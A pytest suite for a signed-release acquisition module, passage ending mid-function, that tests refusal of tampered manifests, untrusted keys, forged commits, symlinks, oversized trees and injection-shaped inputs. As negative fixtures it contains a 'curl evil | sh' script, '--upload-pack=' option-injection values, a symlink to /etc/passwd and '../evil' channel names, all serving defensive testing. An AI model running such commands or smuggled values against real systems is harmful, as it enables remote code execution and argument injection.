"""Behavior contracts for obtaining a release that can be trusted.

docs/UPDATE_ARCHITECTURE.md §9 and §13 (PR6). This is the step that turns a
remote repository into a version this machine is willing to run, and it is the
last gate before `transaction.apply_plan` makes it live. Everything here is
therefore about **refusing**, and about the order refusals happen in.

The load-bearing ordering decision: the tree is verified **out of git's object
store**, before any working tree exists. Nothing unverified is ever written to
disk, and the check never has to make an exception for the `.git` file that a
`git worktree` necessarily contains — an exception the manifest audit
(aud_ifGNyyl_I7UTFOEJ) rated critical when it was applied to `verify_tree`.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import subprocess
from pathlib import Path

import pytest

from scripts.aqg_update import acquire as acquire_mod
from scripts.aqg_update import trust as trust_mod

FIXTURE = Path(__file__).resolve().parent / "fixtures" / "release_test_key.json"


@pytest.fixture(autouse=True)
def no_retry_sleep(monkeypatch):
    # Deterministic fault injection, not wall-clock retry tests.
    import time
    monkeypatch.setattr(time, 'sleep', lambda _: None)


def test_fetch_rejects_option_shaped_remote_before_starting_git(tmp_path, monkeypatch):
    monkeypatch.setattr(acquire_mod, '_git', lambda *a, **k: pytest.fail('Git must not start'))
    with pytest.raises(acquire_mod.AcquireError, match='remote'):
        acquire_mod.available_release(tmp_path, remote='--upload-pack=sentinel', channel='stable',
            keyring=_keyring(), installed_sequence=7)
    with pytest.raises(acquire_mod.AcquireError, match='remote'):
        acquire_mod._fetch(tmp_path, '--upload-pack=sentinel', 'refs/aqg-release/stable')


def test_verified_pin_never_moves_a_symbolic_target_branch(tmp_path):
    origin, commit, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    metadata = _git(origin, 'rev-parse', 'refs/aqg-release/stable').stdout.decode().strip()
    _git(local, 'fetch', 'origin', metadata)
    _git(local, 'branch', 'unrelated', metadata)
    _git(local, 'symbolic-ref', acquire_mod.VERIFIED_REF, 'refs/heads/unrelated')
    found = acquire_mod.available_release(local, remote='origin', channel='stable',
        keyring=_keyring(), installed_sequence=7)
    assert found.commit == commit
    assert _git(local, 'rev-parse', 'unrelated').stdout.decode().strip() == metadata
    assert _git(local, 'rev-parse', acquire_mod.VERIFIED_REF).stdout.decode().strip() == commit


def test_fetch_does_not_apply_configured_mirror_refmap(tmp_path):
    origin, _, manifest = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    _git(local, 'config', 'remote.origin.fetch', '+refs/*:refs/*')
    manifest['version'] = 'tampered'
    _publish(origin, 'stable', manifest, 'invalid')
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(local, remote='origin', channel='stable',
            keyring=_keyring(), installed_sequence=7)
    assert subprocess.run(['git', '-C', str(local), 'rev-parse', '--verify',
        'refs/aqg-release/stable'], capture_output=True).returncode != 0


def test_verified_is_not_a_publishable_channel_name():
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod._require_channel('verified')


@pytest.mark.parametrize('mode', ['--batch-check', '--batch'])
@pytest.mark.parametrize('persistent', [False, True])
def test_signed_tree_batch_retry_is_bounded_before_pinning(tmp_path, monkeypatch, mode, persistent):
    origin, commit, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    real = acquire_mod._batch_once
    attempts = []
    def flaky(repo, args, entries):
        if mode in args:
            attempts.append(1)
            if persistent or len(attempts) == 1:
                raise acquire_mod.GitReadError('synthetic batch read failure')
        return real(repo, args, entries)
    monkeypatch.setattr(acquire_mod, '_batch_once', flaky)
    if persistent:
        with pytest.raises(acquire_mod.AcquireError, match='batch read failure'):
            acquire_mod.available_release(local, remote='origin', channel='stable',
                keyring=_keyring(), installed_sequence=7)
        assert subprocess.run(['git', '-C', str(local), 'rev-parse', '--verify',
            acquire_mod.VERIFIED_REF], capture_output=True).returncode != 0
    else:
        found = acquire_mod.available_release(local, remote='origin', channel='stable',
            keyring=_keyring(), installed_sequence=7)
        assert found.commit == commit
        assert _git(local, 'rev-parse', acquire_mod.VERIFIED_REF).stdout.decode().strip() == commit
    assert len(attempts) == 2


@pytest.mark.parametrize('failure', ['signature', 'commit-option'])
def test_trust_refusal_does_not_fetch_or_read_the_release_tree(tmp_path, monkeypatch, failure):
    origin, _, manifest = _origin(tmp_path)
    if failure == 'commit-option':
        manifest['commit'] = '--upload-pack=sentinel'
    _publish(origin, 'stable', manifest, 'invalid' if failure == 'signature' else _sign(manifest))
    local = _clone(tmp_path, origin)
    real = acquire_mod._git
    calls = []
    def observe(repo, *args, **kwargs):
        calls.append(args[0])
        return real(repo, *args, **kwargs)
    monkeypatch.setattr(acquire_mod, '_git', observe)
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(local, remote='origin', channel='stable',
            keyring=_keyring(), installed_sequence=7)
    assert calls.count('fetch') == 1 and 'ls-tree' not in calls


@pytest.mark.parametrize('failure', ['timeout', 'os-error'])
def test_process_failures_retry_once_without_logging_exception_secrets(tmp_path, monkeypatch, failure):
    attempts = []
    def fail(*args, **kwargs):
        attempts.append(1)
        if failure == 'timeout':
            raise subprocess.TimeoutExpired(['git', 'PRIVATEARG'], 60, stderr=b'PRIVATEERR')
        raise OSError('PRIVATEPATH')
    monkeypatch.setattr(acquire_mod.subprocess, 'run', fail)
    with pytest.raises(acquire_mod.AcquireError) as error:
        acquire_mod._required_git(tmp_path, 'fetch', 'origin', 'stable', timeout=60)
    assert len(attempts) == 2
    assert 'fetch' in str(error.value) and 'PRIVATE' not in str(error.value)


@pytest.mark.parametrize('persistent', [False, True])
def test_batch_read_timeout_reaps_child_before_retry(tmp_path, monkeypatch, persistent):
    children = []
    class Child:
        returncode = 0
        killed = False
        reaped = False
        def communicate(self, data=None, timeout=None):
            if self.killed:
                self.reaped = True
                return b'', b''
            if persistent or len(children) == 1:
                raise subprocess.TimeoutExpired('git', timeout)
            return b'verified test bytes', b''
        def kill(self):
            self.killed = True
    def launch(*args, **kwargs):
        if children:
            assert children[-1].reaped, 'retry started before cleanup'
        child = Child()
        children.append(child)
        return child
    monkeypatch.setattr(acquire_mod.subprocess, 'Popen', launch)
    if persistent:
        with pytest.raises(acquire_mod.AcquireError, match='timed out'):
            acquire_mod._batch(tmp_path, ['cat-file', '--batch'], [('f', 'a' * 40, False)])
        assert children[-1].reaped
    else:
        assert acquire_mod._batch(tmp_path, ['cat-file', '--batch'], [('f', 'a' * 40, False)]) == b'verified test bytes'
    assert len(children) == 2 and children[0].reaped


@pytest.mark.parametrize('operation', ['fetch', 'ls-tree', 'cat-file'])
def test_transient_git_failure_recovers_and_checks_the_signed_tree(tmp_path, monkeypatch, operation):
    origin, commit, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    real = acquire_mod._git
    failed = []
    def flaky(repo, *args, **kwargs):
        if args[0] == operation and not failed:
            failed.append(1)
            return subprocess.CompletedProcess(args, 128, b'', b'fatal: unable to read object')
        return real(repo, *args, **kwargs)
    monkeypatch.setattr(acquire_mod, '_git', flaky)
    found = acquire_mod.available_release(local, remote='origin', channel='stable',
        keyring=_keyring(), installed_sequence=7)
    assert failed and found.commit == commit
    assert _git(local, 'rev-parse', acquire_mod.VERIFIED_REF).stdout.decode().strip() == commit


def test_persistent_fetch_failure_is_bounded_and_does_not_log_remote_secrets(tmp_path, monkeypatch):
    origin, _, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    attempts = []
    def failure(repo, *args, **kwargs):
        attempts.append(args)
        return subprocess.CompletedProcess(args, 128, b'',
            b'fatal: unable to access https://name:PRIVATEVALUE@remote.invalid/repo?token=HIDDEN: Could not resolve host\nAuthorization: Basic OTHERSECRET')
    monkeypatch.setattr(acquire_mod, '_git', failure)
    with pytest.raises(acquire_mod.AcquireError) as error:
        acquire_mod.available_release(local, remote='origin', channel='stable',
            keyring=_keyring(), installed_sequence=7)
    message = str(error.value)
    assert len(attempts) == 2
    assert 'fetch' in message and '128' in message and 'dns' in message
    assert not any(x in message for x in ('PRIVATEVALUE', 'HIDDEN', 'OTHERSECRET', 'remote.invalid'))


@pytest.mark.parametrize('operation', ['ls-tree', 'cat-file'])
def test_persistent_read_failure_never_pins_a_release(tmp_path, monkeypatch, operation):
    origin, _, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    real = acquire_mod._git
    attempts = []
    def failure(repo, *args, **kwargs):
        if args[0] == operation:
            attempts.append(1)
            return subprocess.CompletedProcess(args, 128, b'', b'Permission denied')
        return real(repo, *args, **kwargs)
    monkeypatch.setattr(acquire_mod, '_git', failure)
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(local, remote='origin', channel='stable',
            keyring=_keyring(), installed_sequence=7)
    assert len(attempts) == 2
    assert subprocess.run(['git', '-C', str(local), 'rev-parse', '--verify',
        acquire_mod.VERIFIED_REF], capture_output=True).returncode != 0


def test_retry_does_not_turn_hash_mismatch_into_success(tmp_path, monkeypatch):
    origin, _, manifest = _origin(tmp_path)
    manifest['files']['VERSION']['sha256'] = '0' * 64
    _publish(origin, 'stable', manifest, _sign(manifest))
    local = _clone(tmp_path, origin)
    real = acquire_mod._git
    reads = []
    def observe(repo, *args, **kwargs):
        if args[0] == 'ls-tree':
            reads.append(1)
        return real(repo, *args, **kwargs)
    monkeypatch.setattr(acquire_mod, '_git', observe)
    with pytest.raises(acquire_mod.AcquireError, match='contents do not match'):
        acquire_mod.available_release(local, remote='origin', channel='stable',
            keyring=_keyring(), installed_sequence=7)
    assert len(reads) == 1


_KEY = json.loads(FIXTURE.read_text(encoding="utf-8"))
_N = int(_KEY["modulus_hex"], 16)
_D = int(_KEY["private_exponent_hex"], 16)
_KEY_ID = _KEY["key_id"]


def _keyring(**overrides):
    entry = {
        "key_id": _KEY_ID,
        "algorithm": "rsa-pkcs1v15-sha256",
        "modulus_hex": _KEY["modulus_hex"],
        "exponent": _KEY["exponent"],
        "revoked": False,
    }
    entry.update(overrides)
    return trust_mod.load_keyring({"schema": 1, "keys": [entry]})


def _sign(manifest: dict) -> str:
    digest = hashlib.sha256(trust_mod.canonical_bytes(manifest)).digest()
    encoded = trust_mod.DIGEST_INFO_SHA256 + digest
    width = (_N.bit_length() + 7) // 8
    block = b"\x00\x01" + b"\xff" * (width - len(encoded) - 3) + b"\x00" + encoded
    return base64.b64encode(
        pow(int.from_bytes(block, "big"), _D, _N).to_bytes(width, "big")
    ).decode("ascii")


def _git(repo: Path, *args, **kwargs):
    return subprocess.run(
        ["git", "-C", str(repo), *args], capture_output=True, check=True, **kwargs
    )


def _origin(tmp_path: Path, files=None, *, sequence=8, channel="stable", **manifest_overrides):
    """A remote holding one release: a commit, and a channel ref beside it."""
    repo = tmp_path / "origin"
    repo.mkdir()
    _git_init(repo)
    payload = files if files is not None else {"VERSION": "0.16.0\n", "scripts/a.py": "print(1)\n"}
    for name, content in payload.items():
        target = repo / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-m", "release")
    commit = _git(repo, "rev-parse", "HEAD").stdout.decode().strip()

    # Built here rather than through `internal.release.manifest`, so this suite
    # travels with the module it tests. `acquire` is what the public build runs
    # to decide which code a machine will execute; shipping it without its
    # verification tests would leave that decision unguarded downstream — and
    # the roster still comes from the shipped `commit_roster`, so the fixture is
    # not a second implementation of anything.
    manifest = {
        "schema": trust_mod.MANIFEST_SCHEMA,
        "channel": channel,
        "version": "0.16.0",
        "commit": commit,
        "release_sequence": sequence,
        "key_id": _KEY_ID,
        "files": acquire_mod.commit_roster(repo, commit),
    }
    manifest.update(manifest_overrides)
    _publish(repo, channel, manifest, _sign(manifest))
    return repo, commit, manifest


def _git_init(repo: Path):
    _git(repo, "init", "-q", "-b", "main")
    _git(repo, "config", "user.email", "t@example.com")
    _git(repo, "config", "user.name", "T")
    _git(repo, "config", "commit.gpgsign", "false")


def _publish(repo: Path, channel: str, manifest: dict, signature: str, *, key_id=None):
    """Put the two documents on the channel ref, outside the tree they describe."""
    document = {
        "schema": 1,
        "algorithm": "rsa-pkcs1v15-sha256",
        "key_id": key_id or manifest.get("key_id"),
        "signature": signature,
    }
    blobs = {}
    for name, content in (
        ("manifest.json", json.dumps(manifest, sort_keys=True)),
        ("signature.json", json.dumps(document, sort_keys=True)),
    ):
        out = subprocess.run(
            ["git", "-C", str(repo), "hash-object", "-w", "--stdin"],
            input=content.encode(), capture_output=True, check=True,
        )
        blobs[name] = out.stdout.decode().strip()
    index = "".join(f"100644 blob {sha}\t{name}\n" for name, sha in sorted(blobs.items()))
    tree = subprocess.run(
        ["git", "-C", str(repo), "mktree"], input=index.encode(), capture_output=True, check=True
    ).stdout.decode().strip()
    commit = subprocess.run(
        ["git", "-C", str(repo), "commit-tree", tree, "-m", "release documents"],
        capture_output=True, check=True,
    ).stdout.decode().strip()
    _git(repo, "update-ref", f"refs/aqg-release/{channel}", commit)


def _clone(tmp_path: Path, origin: Path) -> Path:
    local = tmp_path / "local"
    subprocess.run(
        ["git", "clone", "-q", str(origin), str(local)], capture_output=True, check=True
    )
    return local


# --- the good case, so the refusals mean something ------------------------------------


def test_a_correctly_signed_release_is_offered(tmp_path):
    origin, commit, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    found = acquire_mod.available_release(
        local, remote="origin", channel="stable",
        keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
    )
    assert found is not None
    assert found.commit == commit
    assert found.manifest["version"] == "0.16.0"


def test_nothing_is_offered_when_the_sequence_has_not_advanced(tmp_path):
    """Not an error: this is the ordinary answer on almost every check."""
    origin, _, _ = _origin(tmp_path, sequence=8)
    local = _clone(tmp_path, origin)
    assert acquire_mod.available_release(
        local, remote="origin", channel="stable",
        keyring=_keyring(), installed_sequence=8,
    ) is None


# --- refusing what must be refused -----------------------------------------------------


def test_a_tampered_manifest_is_refused(tmp_path):
    origin, commit, manifest = _origin(tmp_path)
    _publish(origin, "stable", {**manifest, "version": "9.9.9"}, _sign(manifest))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_release_signed_by_an_untrusted_key_is_refused(tmp_path):
    origin, _, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(key_id="somebody-else"),
            installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_manifest_naming_a_commit_that_is_not_the_one_fetched_is_refused(tmp_path):
    """The signature covers the manifest; the manifest names a commit. If nobody
    checks that the tree actually is that commit, the signature guarantees
    nothing about the code."""
    origin, commit, manifest = _origin(tmp_path)
    other = "0" * 40
    forged = {**manifest, "commit": other}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_commit_holding_a_file_the_manifest_does_not_cover_is_refused(tmp_path):
    """The roster is checked against git's own object store, so an added file is
    visible before any of it is written to disk."""
    origin, _, manifest = _origin(tmp_path)
    (origin / "extra.sh").write_text("curl evil | sh\n", encoding="utf-8")
    _git(origin, "add", "-A")
    _git(origin, "commit", "-m", "sneak")
    new_commit = _git(origin, "rev-parse", "HEAD").stdout.decode().strip()
    forged = {**manifest, "commit": new_commit}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="extra.sh"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_changed_file_is_refused(tmp_path):
    origin, _, manifest = _origin(tmp_path)
    (origin / "scripts/a.py").write_text("print(666)\n", encoding="utf-8")
    _git(origin, "add", "-A")
    _git(origin, "commit", "-m", "change")
    new_commit = _git(origin, "rev-parse", "HEAD").stdout.decode().strip()
    forged = {**manifest, "commit": new_commit}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="scripts/a.py"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_symlink_in_the_commit_is_refused(tmp_path):
    """A symlink is mode 120000 in the tree, and git will happily check it out
    pointing anywhere on the machine."""
    origin, _, manifest = _origin(tmp_path)
    os.symlink("/etc/passwd", origin / "link")
    _git(origin, "add", "-A")
    _git(origin, "commit", "-m", "link")
    new_commit = _git(origin, "rev-parse", "HEAD").stdout.decode().strip()
    forged = {**manifest, "commit": new_commit}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="symlink"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_release_for_another_channel_is_refused(tmp_path):
    """A correctly signed `edge` release published on the `stable` ref."""
    origin, _, _ = _origin(tmp_path, channel="stable", sequence=9)
    second = tmp_path / "second"
    second.mkdir()
    _, _, edge = _origin(second, channel="edge", sequence=9)
    _publish(origin, "stable", edge, _sign(edge))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="channel"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_an_absent_channel_ref_is_not_current(tmp_path):
    """No verified release is not proof the installed version is current."""
    origin, _, _ = _origin(tmp_path)
    _git(origin, "update-ref", "-d", "refs/aqg-release/stable")
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="fetch"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_being_offline_is_not_current(tmp_path):
    """The runner keeps sessions quiet; acquisition must still report failure."""
    origin, _, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    _git(local, "remote", "set-url", "origin", str(tmp_path / "does-not-exist"))
    with pytest.raises(acquire_mod.AcquireError, match="fetch"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_an_oversized_manifest_is_refused_before_it_is_parsed(tmp_path):
    """The documents arrive from the network. A size cap is the only thing
    between a hostile remote and this process's memory."""
    origin, _, manifest = _origin(tmp_path)
    huge = {**manifest, "padding": "x" * (acquire_mod.MAX_DOCUMENT_BYTES + 1)}
    _publish(origin, "stable", huge, _sign(huge))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="too large"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_nothing_is_written_to_the_working_tree(tmp_path):
    """The ordering that makes the rest of this safe: the commit is verified out
    of the object store, so a rejected release never reaches the filesystem."""
    origin, _, manifest = _origin(tmp_path)
    # Cloned BEFORE the hostile commit exists, so anything that appears in the
    # local working tree afterwards was put there by acquire.
    local = _clone(tmp_path, origin)
    (origin / "extra.sh").write_text("curl evil | sh\n", encoding="utf-8")
    _git(origin, "add", "-A")
    _git(origin, "commit", "-m", "sneak")
    forged = {**manifest, "commit": _git(origin, "rev-parse", "HEAD").stdout.decode().strip()}
    _publish(origin, "stable", forged, _sign(forged))
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )
    assert not (local / "extra.sh").exists()


# --- the pinned keyring this build ships with ------------------------------------------


def test_an_install_with_no_pinned_keyring_cannot_update(tmp_path):
    """Fail closed, and say why. A build with no keyring can verify nothing, so
    it must refuse to update rather than fall back to trusting the remote."""
    with pytest.raises(trust_mod.TrustError, match="no pinned release keyring"):
        trust_mod.load_trusted_keys(tmp_path / "absent.json")


def test_the_pinned_keyring_is_read_from_the_shipped_path(tmp_path):
    document = {
        "schema": 1,
        "keys": [
            {
                "key_id": _KEY_ID,
                "algorithm": "rsa-pkcs1v15-sha256",
                "modulus_hex": _KEY["modulus_hex"],
                "exponent": _KEY["exponent"],
                "revoked": False,
            }
        ],
    }
    path = tmp_path / "release-trust.json"
    path.write_text(json.dumps(document), encoding="utf-8")
    assert _KEY_ID in trust_mod.load_trusted_keys(path)


def test_a_commit_missing_a_file_the_manifest_names_is_refused(tmp_path):
    """The other direction of the roster check.

    A file the manifest covers but the commit does not contain is a release
    whose contents were never the ones signed — and mutation testing showed the
    changed-file test above never reached this branch.
    """
    origin, _, manifest = _origin(tmp_path)
    _git(origin, "rm", "-q", "scripts/a.py")
    _git(origin, "commit", "-m", "remove")
    forged = {**manifest, "commit": _git(origin, "rev-parse", "HEAD").stdout.decode().strip()}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="not in the release commit"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_manifest_naming_a_branch_instead_of_a_commit_is_refused(tmp_path):
    """A release must name an immutable object.

    `main` can resolve to different objects over time. Reject its spelling
    before fetching any code, even if the manifest itself has a valid signature.
    """
    origin, _, manifest = _origin(tmp_path)
    forged = {**manifest, "commit": "main"}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="full lowercase commit ID"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


# =============================================================================
# Added after audit aud_G91P6BqAV9wfVa6- (2 × fundamentally-flawed on the
# central ordering claim). See .aqg/adjudication/.
# =============================================================================


def test_a_rejected_release_leaves_no_ref_behind(tmp_path):
    """The claim that was false.

    The channel ref used to be force-updated with whatever the remote served,
    *before* the signature was checked, so a rejected release permanently
    poisoned it. The documents are read from FETCH_HEAD now and no local ref is
    written at all — and the one ref a *verified* release creates is reused, not
    accumulated.
    """
    origin, _, manifest = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    _publish(origin, "stable", {**manifest, "version": "9.9.9"}, _sign(manifest))
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )
    refs = _git(local, "for-each-ref", "--format=%(refname)", "refs/aqg-release")
    assert not refs.stdout.decode().strip(), (
        f"a rejected release left refs behind: {refs.stdout.decode()!r}"
    )


def test_an_accepted_release_pins_exactly_one_ref(tmp_path):
    """One ref, reused. It exists so `git gc` cannot reclaim the verified commit
    between verifying it and staging it — and it is a single name, so a machine
    that has taken a hundred updates holds one, not a hundred."""
    origin, commit, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    found = acquire_mod.available_release(
        local, remote="origin", channel="stable",
        keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
    )
    assert found is not None
    refs = _git(local, "for-each-ref", "--format=%(refname)", "refs/aqg-release")
    assert refs.stdout.decode().split() == [acquire_mod.VERIFIED_REF]
    assert _git(
        local, "rev-parse", acquire_mod.VERIFIED_REF
    ).stdout.decode().strip() == commit


def test_a_sequence_that_has_not_advanced_is_a_typed_answer_not_a_message(tmp_path):
    """The 'already current' branch used to be a substring match on trust.py's
    wording, so rewording it would have turned every routine check into a
    session-start error, and any other refusal carrying that phrase would have
    been swallowed as 'nothing new'."""
    assert issubclass(trust_mod.SequenceNotAdvanced, trust_mod.TrustError)
    origin, _, _ = _origin(tmp_path, sequence=8)
    local = _clone(tmp_path, origin)
    assert acquire_mod.available_release(
        local, remote="origin", channel="stable",
        keyring=_keyring(), installed_sequence=8,
    ) is None


def test_a_release_whose_blob_is_too_large_is_refused(tmp_path):
    """Sizes are read with `--batch-check`, which returns them without the
    contents, so an oversized tree is refused before a byte of it is in memory.
    """
    big = "x" * (acquire_mod.MAX_BLOB_BYTES + 1)
    origin, _, manifest = _origin(tmp_path)
    (origin / "huge.txt").write_text(big, encoding="utf-8")
    _git(origin, "add", "-A")
    _git(origin, "commit", "-m", "huge")
    commit = _git(origin, "rev-parse", "HEAD").stdout.decode().strip()
    forged = {**manifest, "commit": commit}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="too large"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_channel_name_that_is_not_a_plain_word_is_refused(tmp_path):
    """The channel is interpolated into a refname. A name literally called
    `commits` collided with the namespace an earlier design used for pinned
    commits, and a name containing a slash reaches further than that."""
    origin, _, _ = _origin(tmp_path)
    local = _clone(tmp_path, origin)
    for bad in ("../evil", "a/b", "", "with space", "-dash"):
        with pytest.raises(acquire_mod.AcquireError, match="channel"):
            acquire_mod.available_release(
                local, remote="origin", channel=bad,
                keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
            )


@pytest.mark.parametrize(
    "name,content",
    [
        ("no_trailing_newline", b"abc"),
        ("with_trailing_newline", b"def\n"),
        ("empty", b""),
        ("binary_with_newlines", bytes(range(256))),
    ],
)
def test_the_batch_framing_holds_for_any_blob_shape(tmp_path, name, content):
    """`cat-file --batch` frames every blob as `<sha> blob <size>\\n<bytes>\\n`,
    appending that last newline whatever the blob itself ends with.

    An auditor read the offset arithmetic as assuming the blob supplies it, and
    was wrong — but the tests only used blobs that happened to end in a newline,
    so the parser was correct by luck of fixture choice rather than by check.
    """
    repo = tmp_path / "shapes"
    repo.mkdir()
    _git_init(repo)
    (repo / name).write_bytes(content)
    (repo / "after").write_bytes(b"sentinel\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-m", "shapes")
    commit = _git(repo, "rev-parse", "HEAD").stdout.decode().strip()

    roster = acquire_mod.commit_roster(repo, commit)
    assert roster[name]["sha256"] == hashlib.sha256(content).hexdigest()
    # The entry AFTER it is what desynchronised framing would corrupt.
    assert roster["after"]["sha256"] == hashlib.sha256(b"sentinel\n").hexdigest()


def test_a_tree_whose_total_size_is_too_large_is_refused(tmp_path, monkeypatch):
    """The per-blob cap does not bound the tree: a thousand files just under it
    is not a thousand times safer.

    The caps are lowered rather than the fixture inflated — writing a quarter of
    a gigabyte to prove an arithmetic comparison is a slow test, not a better
    one — but the branch under test is the real one, and mutation testing showed
    the per-blob test never reached it.
    """
    monkeypatch.setattr(acquire_mod, "MAX_BLOB_BYTES", 4096)
    monkeypatch.setattr(acquire_mod, "MAX_TREE_BYTES", 6000)
    origin, _, manifest = _origin(tmp_path)
    for name in ("one.txt", "two.txt"):
        (origin / name).write_text("x" * 4000, encoding="utf-8")
    _git(origin, "add", "-A")
    _git(origin, "commit", "-m", "bulk")
    forged = {**manifest, "commit": _git(origin, "rev-parse", "HEAD").stdout.decode().strip()}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError, match="tree is too large"):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=trust_mod.FIRST_INSTALL,
        )


def test_a_refusal_other_than_a_stale_sequence_is_never_read_as_no_update(tmp_path):
    """The half the typed exception exists for.

    `None` means "nothing to do" and is acted on by exiting quietly. If any
    other refusal could reach that path, a rejected release would look
    identical to a machine that is already current — which is the failure mode
    this whole module is built to make impossible.
    """
    origin, _, manifest = _origin(tmp_path, sequence=9)
    # Correctly signed, newer sequence, wrong channel: a refusal that is NOT a
    # stale sequence, arriving on the path that returns None for stale ones.
    forged = {**manifest, "channel": "edge"}
    _publish(origin, "stable", forged, _sign(forged))
    local = _clone(tmp_path, origin)
    with pytest.raises(acquire_mod.AcquireError):
        acquire_mod.available_release(
            local, remote="origin", channel="stable",
            keyring=_keyring(), installed_sequence=8,
        )


def test_paths_that_collide_on_a_folding_filesystem_are_refused(tmp_path):
    """Deleted with `verify_tree`, and nothing had picked it up.

    A commit can hold both `a` and `A`. On a case-folding filesystem — macOS by
    default — the checkout produces one of them, so the manifest demands more
    files than the disk can hold and verification fails on the user's machine
    while passing on Linux. Which one survives is not something the signature
    can pin either.

    Measured before fixing: a commit with `a` and `A` produced a four-entry
    roster and a three-file worktree.
    """
    repo = tmp_path / "repo"
    repo.mkdir()

    def git(*args, **kwargs):
        return subprocess.run(["git", "-C", str(repo), *args], capture_output=True, **kwargs)

    git("init", "-q", "-b", "main")
    git("config", "user.email", "t@e.com")
    git("config", "user.name", "T")
    (repo / "VERSION").write_text("1\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "base")
    for name, content in (("a", b"lower\n"), ("A", b"UPPER\n")):
        blob = subprocess.run(
            ["git", "-C", str(repo), "hash-object", "-w", "--stdin"],
            input=content, capture_output=True,
        ).stdout.decode().strip()
        git("update-index", "--add", "--cacheinfo", f"100644,{blob},{name}")
    tree = git("write-tree").stdout.decode().strip()
    commit = subprocess.run(
        ["git", "-C", str(repo), "commit-tree", tree, "-m", "collide"],
        capture_output=True,
    ).stdout.decode().strip()

    with pytest.raises(acquire_mod.AcquireError, match="only by case"):
        acquire_mod.commit_roster(repo, commit)


def test_a_normal_commit_is_not_caught_by_the_collision_check(tmp_path):
    """The guard must not refuse ordinary trees; AQG's own has 1191 paths."""
    repo = tmp_path / "plain"
    repo.mkdir()

    def git(*args):
